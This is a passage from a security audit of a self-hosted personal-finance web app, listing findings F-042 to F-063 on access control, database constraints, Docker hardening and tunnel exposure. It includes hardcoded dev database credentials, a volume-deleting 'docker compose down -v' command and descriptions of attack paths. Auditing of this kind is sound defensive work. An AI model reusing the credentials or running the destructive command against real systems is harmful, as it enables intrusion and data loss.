  already has `TransactionUpdateSchema.actual_amount =
  fields.Decimal(places=2, as_string=True, allow_none=True,
  validate=validate.Range(min=0))` -- exactly the schema that
  should have been reused.
- **Evidence:** Three copies of the same parse pattern at
  `transactions.py:321-325, :357-361` and
  `dashboard.py:159-168`.
- **Impact:** Hand-rolled parsing in three places on a
  financial-amount field. Negative or out-of-range values
  produce either silent DB rejects with opaque errors (F-146)
  or 500s with stack traces in the container logs.
- **Recommendation:** Define `MarkDoneSchema` (or reuse
  `TransactionUpdateSchema` with partial loading). Remove
  `dashboard._parse_actual_amount`. Thread the schema output
  through both `mark_paid` and `mark_done`.
- **Status:** Fixed in C-27 (584a688, 2026-05-08).
  `app/schemas/validation.py:335` adds `MarkDoneSchema` (with
  bounded `Range(min=0)` on `actual_amount`), and both
  `transactions.mark_done` branches plus `dashboard` mark-paid load
  through it before mutating. The hand-rolled
  `dashboard._parse_actual_amount` block was removed. Closes both
  F-042 and F-162 (raw decimal in transfer branch).

### F-043: transfers.create_ad_hoc / update_transfer trust raw FK ids

- **Severity:** Medium
- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-639
- **ASVS:** V4.2.1
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-06)
- **Location:** `app/routes/transfers.py:670-712`
  (`create_ad_hoc`), `:617-667` (`update_transfer`),
  `:117-244` (`create_transfer_template` partial coverage)
- **Description:** After Marshmallow accepts the FK integers,
  the route forwards them to the service without explicitly
  verifying each FK belongs to `current_user`. The service
  layer presumably checks, but the route-boundary contract
  (other Shekel routes do verify) is inconsistent.
  `transactions.create_inline` and
  `transactions.create_transaction` are the exemplar: they
  verify `account_id`, `pay_period_id`, `scenario_id`, and
  `category_id` ownership explicitly. These three transfer
  routes do not.
- **Evidence:** Read of `transfers.py:670-712` -- schema load
  followed by direct call to `transfer_service.create_transfer(
  ..., from_account_id=data["from_account_id"], ...,
  category_id=data["category_id"], ...)` with no intermediate
  ownership checks.
- **Impact:** Defense-in-depth regression. Any future refactor
  of the service that relaxes a user-scoping assumption (e.g.
  a new caller that skips the check) immediately opens the
  gap because the route does not re-verify.
- **Recommendation:** Mirror `transactions.create_inline` in
  `create_ad_hoc`: validate `from_account_id`,
  `to_account_id`, `pay_period_id`, `scenario_id`, and
  `category_id` against `current_user.id`. In
  `update_transfer` validate `category_id` if present. In
  `create_transfer_template` validate `category_id` as well.
- **Status:** Fixed in C-27 (584a688, 2026-05-08).
  `app/routes/transfers.py` `create_ad_hoc`, `update_transfer`,
  and `create_transfer_template` now perform per-field FK
  ownership checks at the route boundary before delegating to
  `transfer_service`. The defense-in-depth gap is closed even if
  a future caller bypasses service-level validation.

### F-044: Account-type mutation routes operate on global (non-user-scoped) table

- **Severity:** Medium
- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-732 (Incorrect Permission Assignment)
- **ASVS:** V4.1.3
- **Source:** S1 Subagent B1 (`reports/02a-routes.md` F-B1-07)
- **Location:** `app/routes/accounts.py:543-642`
  (create_account_type, update_account_type,
  delete_account_type)
- **Description:** `ref.account_types` is a GLOBAL reference
  table with no `user_id` column. The three mutation routes
  gate on `@require_owner`, but any owner can rename, modify,
  or delete account types used by every other owner. In the
  current single-owner deployment this is dormant; when a
  second owner enrolls (public deployment, family-account
  mode, or a migration to multi-tenant), it is trivial
  cross-tenant disruption.
- **Evidence:**
  ```python
  # app/routes/accounts.py:543-566
  @accounts_bp.route("/accounts/types", methods=["POST"])
  @login_required
  @require_owner
  def create_account_type():
      ...
      account_type = AccountType(**data)
      db.session.add(account_type)
      db.session.commit()
  ```
  No `user_id` on the `ref.account_types` table (confirmed
  by S6 schema dump `scans/schema-ref-account_types.txt`).
- **Impact:** Multi-owner readiness blocker. Owner A can
  rename `HYSA -> removed` and owner B's accounts get a
  dangling label. Owner A can delete an account type and
  every other owner's accounts referencing it go into a
  broken FK state (unless the FK is RESTRICT and the DELETE
  refuses, which is a DoS).
- **Recommendation:** Two options. (a) Minimum: enforce
  `role_id == OWNER and user_id == <seeded_admin_id>` so only
  the designated admin can mutate global types, and document
  the assumption. (b) Cleaner: add a `user_id` column to
  `ref.account_types`, migrate the seed rows to NULL (meaning
  "shared built-in"), and scope mutation routes to
  user-owned rows. Option (b) is the long-term multi-tenant
  solution.
- **Status:** Fixed in C-28 (b5b576c, 2026-05-08). Implemented
  option (b). `app/models/ref.py:31-111` adds `user_id` to
  `ref.account_types` with two partial unique indexes:
  `uq_account_types_seeded_name` (`(name) WHERE user_id IS NULL`)
  for shared seed rows and `uq_account_types_user_name`
  (`(user_id, name) WHERE user_id IS NOT NULL`) for per-tenant
  rows. Mutation routes in `app/routes/accounts.py` are scoped to
  `user_id` and the table is in `AUDITED_TABLES`.

### F-045: Step-up authentication missing for high-value operations

- **Severity:** Medium
- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-306 (Missing Authentication for Critical Function)
- **ASVS:** V4.3.3
- **Source:** S7 (`reports/18-asvs-l2.md` V4.3.3)
- **Location:** App-wide; no `fresh_login_required` equivalent
  anywhere.
- **Description:** No step-up re-auth exists for: anchor-
  balance changes (F-009 surface), bulk-delete, companion
  creation (can grant companion role), tax-config changes,
  data export. Every authenticated request is treated
  equally. A short-term session hijack gives full access to
  alter core financial data.
- **Evidence:** Grep of `app/` for
  `fresh_login_required|require_recent_auth|
  re_authenticate` returns zero hits.
- **Impact:** A cookie-theft or XSS-fed session hijack has
  the same blast radius as a logged-in owner. High-value
  operations should demand recent re-auth (TOTP re-entry,
  password re-entry) to blunt short-lived attacker access.
- **Recommendation:** Add a `fresh_login_required` decorator
  that checks `flask_session["_fresh_login_at"]` is within
  the last N minutes (e.g. 5). Apply to: anchor-balance
  true-up, bulk-delete transactions, companion creation,
  account deletion, tax-config update. Handler body can
  redirect to a re-auth prompt; on success, update the
  timestamp.
- **Status:** Fixed in C-10 (2509357, 2026-05-04).
  `app/utils/auth_helpers.py:319` defines
  `fresh_login_required(max_age_minutes)` -- a decorator that
  checks `_fresh_login_at` and redirects to `/reauth` when stale.
  The decorator now gates anchor-balance true-up, bulk delete,
  companion creation, account deletion, and tax-config mutation
  paths.

### F-046: No DB constraint enforcing "exactly two shadows per transfer"

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-840 (Business Logic Errors)
- **ASVS:** V13.1.4
- **Source:** S1 Subagent B2 (`reports/02b-services.md`
  F-B2-03); S5 (`reports/16-business-logic.md` confirms and
  cites `scripts/repair_orphaned_transfers.py` in the repo as
  evidence a similar gap has manifested in production)
- **Location:** `app/models/transfer.py`,
  `app/models/transaction.py:94-97`
- **Description:** `create_transfer` at the service layer is
  the sole legitimate writer and always creates exactly two
  shadow Transaction rows (one expense, one income). The
  database has no constraint that prevents a Transfer from
  having zero, one, three, or seventeen shadow Transaction
  rows. Nothing prevents two expense-typed shadows pointing at
  the same Transfer. The repo-level evidence that a similar
  bug has hit production: `scripts/repair_orphaned_transfers.py`
  exists, documenting a past `create_transfer_template` bug
  that created Transfers without shadows.
- **Evidence:**
  ```python
  # app/models/transaction.py:94-97
  transfer_id = db.Column(
      db.Integer,
      db.ForeignKey("budget.transfers.id", ondelete="CASCADE"),
  )
  # No partial unique index on (transfer_id, transaction_type_id).
  ```
- **Impact:** Latent defect vector. Any future path that
  bypasses the service (data-backfill migration, raw SQL
  admin fix, F-028-style trigger-bypass) creates orphan
  shadows or duplicate shadows that violate Invariant 1. The
  service-level `_get_shadow_transactions` check catches the
  state on next mutation but does not prevent it from being
  written.
- **Recommendation:** Add a partial unique index:
  `CREATE UNIQUE INDEX uq_transactions_transfer_type_active
  ON budget.transactions (transfer_id, transaction_type_id)
  WHERE transfer_id IS NOT NULL AND is_deleted = FALSE;`.
  This prevents two expense-typed or two income-typed shadows
  from coexisting for the same Transfer. Full belt-and-braces
  adds a PL/pgSQL trigger asserting `COUNT(*)=2` active
  shadows per active Transfer. Prefer the partial unique
  index as the minimum.
- **Status:** Fixed in C-21 (f16fdc9, 2026-05-07).
  `app/models/transaction.py:80` declares the partial unique
  index `uq_transactions_transfer_type_active` on
  `(transfer_id, transaction_type_id) WHERE transfer_id IS NOT
  NULL AND is_deleted = FALSE`; matching Alembic migration is
  `migrations/versions/c21a1f0b8e74_add_partial_unique_index_for_transfer_.py`.
  Two expense-typed or income-typed shadows can no longer coexist
  for one Transfer.

### F-047: Transfer status transitions have no state-machine check

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-362 (Concurrent Modification)
- **ASVS:** V1.1.5
- **Source:** S5 (`reports/16-business-logic.md` M-C2-06)
- **Location:** `app/services/transfer_service.py:468-473`
  (update_transfer status branch);
  `app/routes/transfers.py:748-749`
- **Description:** `update_transfer` accepts any `status_id`
  and writes it to the Transfer and both shadows with no
  state-machine validation. A Transfer already in `CANCELLED`
  can be flipped to `DONE` via a stale-form submission;
  balance calculator then treats a non-existent transfer as
  settled. No CHECK constraint on allowed transitions.
- **Evidence:** Read of `transfer_service.py:468-473` shows
  direct assignment without a "can transition from X to Y"
  guard. Reference workflow `projected -> done|credit|
  cancelled` and `done|received -> settled` from CLAUDE.md is
  not enforced in code.
- **Impact:** A cancelled transfer reappears as DONE. Balance
  projections incorrectly include the non-existent transfer.
  User-facing inconsistency when a transfer they cancelled
  reappears paid.
- **Recommendation:** Implement a transitions table at module
  scope: `_ALLOWED_TRANSITIONS = {PROJECTED_ID: {DONE_ID,
  CREDIT_ID, CANCELLED_ID}, DONE_ID: {SETTLED_ID, ...}, ...}`
  keyed by ref-table IDs. In `update_transfer` when
  `status_id` changes, verify the new status is in
  `_ALLOWED_TRANSITIONS.get(xfer.status_id, set())`. Reject
  with `ValidationError` otherwise.
- **Status:** Fixed in C-21 (f16fdc9, 2026-05-07).
  `app/services/state_machine.py` declares the allowed-transition
  table; `app/services/transfer_service.py:499` calls
  `verify_transition(xfer.status_id, new_status_id, context=...)`
  on every status change for the parent transfer plus both shadow
  rows. The follow-up commit f4684962 (C-21 follow-up) extends the
  same helper to `transaction_service` so regular transactions
  share one state machine.

### F-048: Transfer mark_done from transfers page does not set paid_at

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-1287 (Improper Validation of Specified Type of
  Input)
- **ASVS:** V1.1.5
- **Source:** S5 (`reports/16-business-logic.md` M-C2-07)
- **Location:** `app/routes/transfers.py:739, :748-749` (via
  transfers-management page); compare
  `app/routes/dashboard.py:75-78` and
  `app/routes/transactions.py:316-319` (correct pattern)
- **Description:** `transfers.mark_done` calls
  `transfer_service.update_transfer(status_id=DONE)` without
  passing `paid_at=db.func.now()`. The grid and dashboard
  mark-done flows both pass `paid_at`. Result: shadow
  Transaction rows marked DONE via the transfers-management
  page have `paid_at IS NULL`, while shadows done via grid or
  dashboard have it set.
- **Evidence:**
  ```python
  # transfers.py:749
  transfer_service.update_transfer(
      xfer_id, current_user.id, status_id=done_id,
  )
  # No paid_at argument.
  ```
  vs:
  ```python
  # dashboard.py:75-78
  transfer_service.update_transfer(
      xfer_id, current_user.id, status_id=done_id,
      paid_at=db.func.now(),
  )
  ```
- **Impact:** `Transaction.days_paid_before_due` returns None
  for transfers marked DONE via the transfers-management
  page. Analytics, spending trends, and year-end reports miss
  the timing data for those transfers.
- **Recommendation:** Add `paid_at=db.func.now()` to the
  `update_transfer` call at `transfers.py:749`. One-line
  fix. Consider pushing this into
  `transfer_service.update_transfer`: if `status_id` is
  transitioning to DONE and no `paid_at` was passed, set it
  server-side.
- **Status:** Fixed in C-22 (5397ac9, 2026-05-07).
  `app/routes/transfers.py:1106` (the `mark_done` route) passes
  `paid_at=db.func.now()` so the transfer-management page now
  matches the dashboard fast-action path. Service-level fallback
  is at `app/services/transfer_service.py:522` for the explicit-
  None case.

### F-049: carry_forward_unpaid has no status precondition check

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-362 (Concurrent Modification)
- **ASVS:** V1.11.3
- **Source:** S5 (`reports/16-business-logic.md` M-C2-05)
- **Location:** `app/routes/transactions.py:715` (endpoint);
  `app/services/carry_forward_service.py:71-91` (implementation)
- **Description:** The service reads projected transactions
  from the source period (SELECT), then updates
  `pay_period_id` to the target period for each. Between the
  SELECT and the UPDATE, another tab can mark a transaction
  DONE. The already-loaded SQLAlchemy snapshot still contains
  the DONE transaction; the service writes its new
  `pay_period_id` anyway, carrying a DONE transaction into a
  future period where it should not exist.
- **Evidence:** Read of
  `carry_forward_service.py:71-91` shows the
  `projected_txns` list is iterated and
  `txn.pay_period_id = target_period_id` written without
  re-checking `txn.status_id`.
- **Impact:** A carried-forward DONE transaction appears in
  the wrong period's grid. Reports filtered by period show
  the transaction in the wrong month. Balance math largely
  unaffected (DONE txns are excluded from projection on both
  source and target) but UI inconsistency is visible and
  confusing.
- **Recommendation:** Either (a) `.with_for_update()` on the
  source SELECT so the rows are locked for the duration of
  the carry-forward, or (b) change the UPDATE to the
  conditional form:
  `UPDATE budget.transactions SET pay_period_id=:target
  WHERE id IN (:ids) AND status_id = :projected`. Option (b)
  is cheaper and matches the "only still-projected moves"
  semantics exactly.
- **Status:** Fixed in C-22 (5397ac9, 2026-05-07). Implemented
  option (b). `app/services/carry_forward_service.py` replaces the
  per-row `setattr` with a conditional bulk UPDATE that filters on
  `status_id = projected` so a row that flipped state between SELECT
  and UPDATE is left untouched. The same commit pulls common setup
  into `_build_carry_forward_context` shared by the mutating and
  preview paths.

### F-050: Ad-hoc transfer POST has no idempotency -- duplicate shadows

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-837 (Improper Enforcement of a Single, Unique
  Action)
- **ASVS:** V1.1.5
- **Source:** S5 (`reports/16-business-logic.md` M-I2)
- **Location:** `app/routes/transfers.py` (POST
  /transfers/ad-hoc)
- **Description:** No unique constraint on ad-hoc transfers
  (`template_id IS NULL`). No rate limit. No idempotency
  token. User clicks "Save" on a $500 transfer; HTMX lag
  causes a second click. Two POST requests each create 1
  Transfer + 2 shadows = 6 total rows (2 Transfers, 4
  shadows). Balance calculator subtracts $1000 (not $500)
  from checking and adds $1000 (not $500) to savings.
- **Evidence:** Read of the ad-hoc transfer POST handler
  shows no duplicate-suppression logic.
- **Impact:** Visible duplicate transfers, wrong balances,
  manual cleanup required. Unlike F-103 (ad-hoc transaction
  duplicate), the transfer variant creates 4 shadow
  transactions, each of which participates in balance math
  -- higher blast radius per duplicate.
- **Recommendation:** Client-side debounce on the submit
  button (disable on click, re-enable on HTMX completion).
  Server-side: idempotency-key field with short TTL, or a
  unique constraint on `(user_id, from_account_id,
  to_account_id, amount, pay_period_id, created_at
  truncated to minute)` via Alembic.
- **Status:** Fixed in C-22 (5397ac9, 2026-05-07). Idempotency
  uniqueness migration
  `migrations/versions/e8b14f3a7c22_c22_idempotency_uniqueness_constraints.py`
  ships partial unique constraints across the affected entry points
  (transfer ad-hoc, anchor true-up, loan-rate change, pension
  profile). Closes F-103, F-104, F-105 in the same commit.

### F-051: Salary raise POST has no composite unique -- duplicate raise event

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-837
- **ASVS:** V1.1.5
- **Source:** S5 (`reports/16-business-logic.md` M-I5)
- **Location:** `app/routes/salary.py` (POST
  /salary/<profile_id>/raises)
- **Description:** No composite unique on `(salary_profile_id,
  raise_type_id, effective_year, effective_month)`. User
  adds a 3% raise effective 2026-01; form lags; user clicks
  again. Two SalaryRaise rows inserted with identical fields.
  `paycheck_calculator._apply_raises` applies each
  independently: `salary * 1.03 * 1.03` instead of
  `salary * 1.03`.
- **Evidence:** Read of `app/models/salary_raise.py` shows no
  composite unique constraint.
- **Impact:** For $50K salary, every future paycheck is
  projected 6.09% above baseline instead of 3% -- ~$1500/year
  phantom income. User may not notice until actual paycheck
  arrives and disagrees with projection.
- **Recommendation:** Add a migration with
  `uq_salary_raises_profile_year_month_type` on
  `(salary_profile_id, raise_type_id, effective_year,
  effective_month)`. Model-level
  `UniqueConstraint(...)`. Alternative: client-side debounce.
  Unique constraint is stronger.
- **Status:** Fixed in C-23 (e66c235, 2026-05-07).
  `app/models/salary_raise.py:75` declares
  `uq_salary_raises_profile_type_year_month` on
  `(salary_profile_id, raise_type_id, effective_year,
  effective_month)`. Migration
  `migrations/versions/a3b9c2d40e15_c23_salary_raise_deduction_uniqueness.py`
  creates the constraint live; the inflation-compounding bug is
  blocked at the DB layer.

### F-052: Paycheck deduction POST has no composite unique -- duplicate deduction

- **Severity:** Medium
- **OWASP:** A04:2021 Insecure Design
- **CWE:** CWE-837
- **ASVS:** V1.1.5
- **Source:** S5 (`reports/16-business-logic.md` M-I6)
- **Location:** `app/routes/salary.py` (POST
  /salary/<profile_id>/deductions)
- **Description:** No composite unique on
  `(salary_profile_id, name)`. User adds "401(k) 6% pre-tax"
  deduction; double-submit creates two.
  `_calculate_deductions` iterates `profile.deductions` and
  applies each, so 401(k) is deducted twice per paycheck.
  Annual cap logic also applies twice as fast.
- **Evidence:** Read of `app/models/paycheck_deduction.py`
  shows no composite unique constraint.
- **Impact:** Net pay projection understated by duplicate
  deduction amount. For $500 biweekly 401(k), net pay $500
  lower per paycheck = $13K/year projection error.
- **Recommendation:** Alembic migration adding
  `uq_paycheck_deductions_profile_name` on
  `(salary_profile_id, name)`. Before applying, query for
  and dedup any existing duplicates.
- **Status:** Fixed in C-23 (e66c235, 2026-05-07).
  `app/models/paycheck_deduction.py:71` declares
  `uq_paycheck_deductions_profile_name` on
  `(salary_profile_id, name)`. Migration
  `migrations/versions/a3b9c2d40e15_c23_salary_raise_deduction_uniqueness.py`
  installs the constraint after a precautionary dedup pass.

### F-053: REGISTRATION_ENABLED=true in production environment

- **Severity:** Medium
- **OWASP:** A07:2021 Identification and Authentication Failures
- **CWE:** CWE-284 (Improper Access Control)
- **ASVS:** V2.1.4
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-06)
- **Location:** `shekel-prod-app` container env
- **Description:** The production container has
  `REGISTRATION_ENABLED=true`. Any client that reaches the
  app -- from the public WAN via Cloudflare Tunnel OR from
  the LAN via nginx:443 -- can create an account.
- **Evidence:** `docker exec shekel-prod-app env | grep
  REGISTRATION_ENABLED` returns `true`.
- **Impact:** For a personal-finance app intended for a
  specific user set, open registration is unnecessary
  exposure. New accounts are companion-role (not owner) so
  the blast radius is limited, but the registration surface
  is still attacker-reachable.
- **Recommendation:** Set `REGISTRATION_ENABLED=false` in
  production `.env` after intended users are created. Gate
  re-enable behind an invite-code flow if needed. The
  existing `@REGISTRATION_ENABLED` gate at
  `app/routes/auth.py` already handles the false case
  (returns 404).
- **Status:** Open

### F-054: Stale pre-rename containers still running

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1295 (Debug Messages Revealing Unnecessary
  Information)
- **ASVS:** V14.1.1
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-05);
  S3 Section 1I (`reports/13-attack-surface.md` Section 3.4)
- **Location:** Host Docker state: `shekel-app` (unhealthy,
  2673+ consecutive healthcheck failures as of S2),
  `shekel-db` (healthy), `shekel-nginx` (Created, never
  started); networks `shekel_backend`, `shekel_frontend`,
  `shekel_default`; volume `shekel_pgdata`.
- **Description:** Pre-2026-03-23 containers from the project
  rename were never removed. `restart: unless-stopped` keeps
  them running. `shekel-app` cannot connect to its
  now-nonexistent database, so it auto-restarts
  continuously, burning CPU to no purpose. `shekel-db` is
  still running PostgreSQL with the `shekel_pgdata` volume,
  which may contain pre-rename production data.
- **Evidence:** `docker ps -a` + `docker network ls` from S2.
- **Impact:** (1) `shekel-app` running an older app version
  expands attack surface. (2) `shekel-db` with unknown
  contents is latent data-at-rest risk. (3) Continuous
  restart loop fills Docker logs (F-118 log rotation gap).
- **Recommendation:** (1) Confirm `shekel_pgdata` volume
  contents -- if real data, back up; if test data, delete.
  (2) `docker compose -p shekel down -v` (careful: the -v
  removes volumes; don't run until the backup confirmation
  step). (3) Remove the stale networks.
- **Status:** Open

### F-055: no-new-privileges not set at daemon or per-container level

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)
- **ASVS:** V14.1.1
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-07
  per-container); S2 Section 1H
  (`reports/12-host-hardening.md` F-H-04 daemon default);
  docker-bench 2.14 + 5.26
- **Location:** `docker-compose.yml` (no
  `security_opt`); `/etc/docker/daemon.json` (no
  `no-new-privileges: true`)
- **Description:** None of the three production containers
  sets `--security-opt=no-new-privileges`. The Docker daemon
  does not set it as a default. The flag prevents processes
  inside a container from gaining additional privileges via
  setuid binaries or other escalation mechanisms.
- **Evidence:** `docker-bench 5.26` flags all three
  containers; `SecurityOpt: null` in
  `scans/container-hostconfig.json`,
  `scans/nginx-hostconfig.json`,
  `scans/db-hostconfig.json`.
- **Impact:** If an attacker gains code execution inside a
  container, they can potentially escalate via setuid
  binaries in the base image.
- **Recommendation:** Preferred: add
  `{ "no-new-privileges": true }` to
  `/etc/docker/daemon.json` (applies to every container by
  default). Alternative: add `security_opt:
  ["no-new-privileges:true"]` to each service in
  `docker-compose.yml`.
- **Status:** Open

### F-056: No capability dropping on any container

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-250
- **ASVS:** V14.1.1
- **Source:** S2 Section 1D (`reports/08-runtime.md` F-D-08)
- **Location:** `docker-compose.yml` for all three services
- **Description:** Docker's default capability set for
  containers includes capabilities the app doesn't need
  (`NET_RAW`, `SYS_CHROOT`, `MKNOD`, `AUDIT_WRITE`, etc.).
  Best practice is `cap_drop: [ALL]` with selective
  add-back only of what's needed.
- **Evidence:** `CapAdd: null, CapDrop: null` in all three
  `*-hostconfig.json` files.
- **Impact:** Broader capability set = more options for an
  attacker if code execution inside a container is achieved.
- **Recommendation:** Add `cap_drop: [ALL]` to each service
  in `docker-compose.yml`; add back only capabilities
  specific services actually need (likely none for the
  Python app; `NET_BIND_SERVICE` if nginx binds a privileged
  port, though the compose binds 80/443 via the host).
- **Status:** Open

### F-057: Dev databases bound to 0.0.0.0 with public credentials

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-668 (Exposure of Resource to Wrong Sphere)
- **ASVS:** V14.1.3
- **Source:** S2 Section 1H (`reports/12-host-hardening.md`
  F-H-05); S3 Section 1I (`reports/13-attack-surface.md`
  section 2.3/2.4 + Section 6 finding #1)
- **Location:** `docker-compose.dev.yml:32-36, :51-55`
- **Description:** Both dev Postgres containers
  (`shekel-dev-db:5432`, `shekel-dev-test-db:5433`) bind to
  `0.0.0.0`, making them reachable from any LAN device.
  Credentials `shekel_user` / `shekel_pass` are hardcoded in
  the committed compose file and therefore already public on
  the GitHub (private) repo.
- **Evidence:**
  ```yaml
  # docker-compose.dev.yml:36
  ports:
    - "5432:5432"  # binds 0.0.0.0:5432 by default
  ```
- **Impact:** Any LAN device (phone, laptop, compromised
  IoT) can `psql` into the dev databases with one-line
  public credentials. If the dev DB ever shares a volume or
  seed file with prod, PII leakage is direct. Even without,
  an attacker can write to the dev DB, plant a poisoned
  seed, and wait for the developer to accidentally promote it.
- **Recommendation:** Change both ports to
  `"127.0.0.1:5432:5432"` and `"127.0.0.1:5433:5432"` so the
  bindings are loopback-only. Flask dev server uses
  `localhost` by default, so no app change needed.
- **Status:** Open

### F-058: pyotp stale -- 33 months since last release

- **Severity:** Medium
- **OWASP:** A06:2021 Vulnerable and Outdated Components
- **CWE:** CWE-1104 (Use of Unmaintained Third-Party
  Components)
- **ASVS:** V14.2.2
- **Source:** S2 Section 1E (`reports/09-supply-chain.md`
  F-E-01)
- **Location:** `requirements.txt` (`pyotp==2.9.0`)
- **Description:** Last pyotp release 2023-07-27, 33 months
  before the audit. pyotp implements TOTP (RFC 6238) --
  the core cryptographic primitive for Shekel's MFA. The
  library is small, the RFC is stable, and low activity is
  not inherently alarming, but 33 months without a release
  implies: no Python 3.13/3.14 compatibility testing, no
  response to reported issues since mid-2023, unknown fix
  responsiveness to a newly-discovered vulnerability.
- **Evidence:** PyPI metadata via pip-audit + trivy-sbom
  (`scans/trivy-sbom.txt`).
- **Impact:** If a vulnerability is discovered in pyotp's
  TOTP verification (e.g. a timing side-channel in
  comparison), there may be no upstream fix available
  promptly. Shekel's MFA would need to migrate or fork.
- **Recommendation:** Monitor the upstream GitHub for
  activity. Evaluate maintained alternatives (`authlib`,
  `otp-gen-py`, or a hand-rolled RFC 6238 implementation ~50
  LOC). Consider forking to a Shekel-controlled mirror with
  pinned-hash requirements as defensive measure.
- **Status:** Open

### F-059: Flask-Login stale -- 30 months since last release

- **Severity:** Medium
- **OWASP:** A06:2021 Vulnerable and Outdated Components
- **CWE:** CWE-1104
- **ASVS:** V14.2.2
- **Source:** S2 Section 1E (`reports/09-supply-chain.md`
  F-E-02)
- **Location:** `requirements.txt` (`Flask-Login==0.6.3`)
- **Description:** Last release 2023-10-30 (30 months). 3
  maintainers, mature and widely used, but a 2.5-year gap
  on a package handling session management state is
  concerning. No observed Python 3.14 compatibility issues,
  but none is documented either.
- **Evidence:** Same as F-058.
- **Impact:** Same profile as F-058. A session-management
  vulnerability requires unknown upstream response time.
- **Recommendation:** Monitor. Verify production runs
  correctly on Python 3.14 (matches the container runtime).
  Evaluate Flask-Security-Too as a managed alternative.
- **Status:** Open

### F-060: Container image pins to `:latest` tag

- **Severity:** Medium
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted
  Control Sphere)
- **ASVS:** V14.2.4
- **Source:** S1 Subagent C (`reports/03-config-deploy.md`
  F-C-10); cross-ref to S2 Section 1G F-G-I1 clean Dockerfile
- **Location:** `docker-compose.yml:48`
- **Description:** `image: ghcr.io/saltyreformed/shekel:latest`
  with `pull_policy: always`. Every `docker compose up`
  silently pulls the current `:latest`. Rollback requires
  re-pushing the previous commit to rebuild `:latest`, not
  simply pinning to a previously-known-good digest. If GHCR
  or the repo is ever compromised at the registry layer,
  every restart pulls the tampered image.
- **Evidence:** Read of `docker-compose.yml:48`.
- **Impact:** Deploy is not reproducible. Supply-chain attack
  surface: a single push to the tag compromises the next
  container recreate.
- **Recommendation:** Replace `:latest` with an immutable
  digest on every deploy: `image: ghcr.io/saltyreformed/
  shekel@sha256:...`. Update `scripts/deploy.sh` to rewrite
  the digest on each release. Alternative: concrete version
  tags (`:v0.12.3`) that are never overwritten. `postgres:16-
  alpine` and `nginx:1.27-alpine` minor-pins are
  acceptable.
- **Status:** Open

### F-061: cloudflared has no Access policy and uses noTLSVerify: true

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-287, CWE-295
- **ASVS:** V9.1.1
- **Source:** S1 Subagent C (`reports/03-config-deploy.md`
  F-C-11); S3 Section 1I (`reports/13-attack-surface.md`
  Section 6 finding #6)
- **Location:** `cloudflared/config.yml:49-57`
- **Description:** Two sub-issues: (1) no `team_name` /
  Cloudflare Access block in the committed config, so the
  tunnel publishes the app to the open internet (behind
  Cloudflare DDoS but without edge auth). The operator may
  have configured Access via the dashboard, but the committed
  artifact alone is permissive. (2) `noTLSVerify: true` is
  set because cloudflared + nginx share loopback, but it's
  worth documenting that Nginx has no `listen 443`/`ssl_*`
  stanza (plain HTTP on loopback) so the tunnel-to-Nginx hop
  is clear text.
- **Evidence:**
  ```yaml
  # cloudflared/config.yml:49-57
  ingress:
    - hostname: <DOMAIN>
      service: http://localhost:80
      originRequest:
        noTLSVerify: true
  ```
- **Impact:** Without Access, the only gate between the
  public internet and Shekel is Flask's own login. For a
  money app intending public release, edge-level auth is
  defense-in-depth that closes the WAN brute-force surface.
- **Recommendation:** (1) Confirm Cloudflare Access policy
  is attached (email auth minimum, device certs preferred).
  Capture the state as evidence in
  `docs/audits/security-2026-04-15/scans/` on every audit
  cycle. (2) Leave `noTLSVerify: true` in place but add a
  comment citing the loopback colocation.
- **Status:** Open

### F-062: Two HIGH OS CVEs with no fix available in container image

- **Severity:** Medium
- **OWASP:** A06:2021 Vulnerable and Outdated Components
- **CWE:** CWE-1395
- **ASVS:** V14.2.2
- **Source:** S2 Section 1G (`reports/11-container-image.md`
  F-G-02). Downgraded from HIGH because neither is reachable
  in Shekel's usage.
- **Location:** Docker image ncurses packages and systemd
  packages
- **Description:** CVE-2025-69720 (ncurses buffer overflow,
  no fix) and CVE-2026-29111 (systemd IPC code execution, no
  fix). Both packages are present in the Debian slim base
  image as dependencies of other packages but are not used
  by Gunicorn + Flask at runtime.
- **Evidence:** `scans/trivy-image.json` CVE entries.
- **Impact:** Low reachability. ncurses is a terminal UI
  library (no interactive terminal in the container).
  systemd IPC is not exposed in the container. Both are
  present because of base-image transitive dependencies.
- **Recommendation:** Accept with monitoring. When Debian
  publishes fixes, rebuild. Consider migrating to distroless
  or Alpine base image to eliminate the OS attack surface
  entirely (fewer packages = fewer CVEs to track).
- **Status:** Open

### F-063: Cloudflare Tunnel bypasses nginx on WAN path

- **Severity:** Medium
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-653 (Improper Isolation or Compartmentalization)
- **ASVS:** V14.4.1
- **Source:** S3 Section 1I (`reports/13-attack-surface.md`
  Section 6 finding #2)
- **Location:** `cloudflared/config.yml` ingress routing to
  `http://shekel-prod-app:8000` directly; shared
  `/opt/docker/nginx` is only on the LAN path
- **Description:** WAN traffic via Cloudflare Tunnel lands
  directly on `shekel-prod-app:8000` (Gunicorn), bypassing
  both the shared homelab nginx AND the repo's bundled
  nginx (disabled via override). All of
  `client_max_body_size 5M`, the 30s header/body timeouts,
  `set_real_ip_from` normalization, gzip, and whatever
